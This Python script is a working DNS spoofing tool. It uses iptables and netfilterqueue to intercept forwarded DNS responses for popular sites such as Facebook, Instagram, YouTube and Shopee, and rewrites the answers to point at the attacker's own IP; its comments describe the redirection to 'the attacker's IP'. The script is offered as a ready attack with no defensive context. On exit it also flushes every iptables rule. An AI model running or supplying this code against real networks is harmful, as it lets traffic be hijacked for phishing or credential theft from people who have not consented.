from scapy.all import *
from netfilterqueue import NetfilterQueue, Packet
import os
import socket

def build_dns_resolver():
    domains = {}

    sites = [
        "facebook",
        "linkedin",
        "youtube",
        "x",
        "instagram",
        "aliexpress",
        "mercadolivre",
        "shein",
        "shopee"
    ]

    for FQDNs in _get_FQDNs(sites):
        for fqdn in FQDNs:
            domains[fqdn] = _get_ip()
    
    return domains

def _get_FQDNs(sites: list[str]) -> list[bytes]:
    def build_FQDNs(domain: str) -> list[bytes]:
        domains = []
        extensions = [".com.", "br.", "www."]
        
        domains.append((domain+extensions[0]).encode("ASCII"))
        domains.append((domain+extensions[0]+extensions[1]).encode("ASCII"))
        domains.append((extensions[2]+domain+extensions[0]).encode("ASCII"))
        domains.append((extensions[2]+domain+extensions[0]+extensions[1]).encode("ASCII"))

        return domains

    for site in sites:
        yield build_FQDNs(site)

def _get_ip() -> str:
    ## Script to get my private ip
    skt = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    skt.settimeout(0)
    try:
        skt.connect(("125.58.74.241", 1))
        ip = skt.getsockname()[0]
    except Exception:
        ip = "127.0.0.1"
    finally:
        skt.close()
    
    return ip

dns_resolver = build_dns_resolver()

def process_packet(netfilter_packet: Packet) -> None:
    ## Get the netfilter packet and convert it into a scapy packet
    scapy_packet = IP(netfilter_packet.get_payload())

    if scapy_packet.haslayer(DNSRR):
        ## Try to modify the packet if it has a DNS Resource Record entry
        print(">> [BEFORE] PACKET: ", scapy_packet.summary())
        try:
            scapy_packet = _modify_packet(scapy_packet)
        except IndexError:
            pass
        
        print(">> [AFTER] PACKET: ", scapy_packet.summary())
        ## Set the newly formed packet with the modified payload
        netfilter_packet.set_payload(bytes(scapy_packet))
    
    ## Accept the packet
    netfilter_packet.accept()

def _modify_packet(scapy_packet: IP) -> IP:
    ## Check if the domain in the packet is in our domain list
    if scapy_packet[DNSQR].qname in dns_resolver:
        ## Modify the packet redirecting the request to the attacker's IP
        scapy_packet[DNS].an = DNSRR(rrname=scapy_packet[DNSQR].qname, rdata=dns_resolver[scapy_packet[DNSQR].qname])
        
        ## Changes the ancount field in the DNS packet to 1
        ## This means that we have exactly one DNS Resource Record in this answer sections of this DNS Packet
        scapy_packet[DNS].ancount = 1

        ## We delete all the lens and checksums because they are incorrect
        ## Once we changed the payload, these values changed
        ## fortunately, scapy does all these calcs for us
        del scapy_packet[IP].len
        del scapy_packet[IP].chksum
        del scapy_packet[UDP].len
        del scapy_packet[UDP].chksum

        ## Returns the modified packet
        return scapy_packet
    
    ## Just returns the original packet if not
    return scapy_packet
    

def main() -> None:
    QUEUE_NUM = 0
    ## Insert the FORWARD rule into the linux's IPTABLES
    os.system(f"iptables -I FORWARD -j NFQUEUE --queue-num {QUEUE_NUM}")
    ## Instantiates the Netfilter queue
    queue = NetfilterQueue()
    try:
        ## Associates the QUEUE number to a callback function
        ## when it receives a packet, the callback function is used to process it
        queue.bind(QUEUE_NUM, process_packet)
        queue.run()
    except KeyboardInterrupt:
        ## Returns the IPTABLEs back to normal by removing the previuosly added rule
        os.system("iptables --flush")

if __name__ == "__main__":
    main()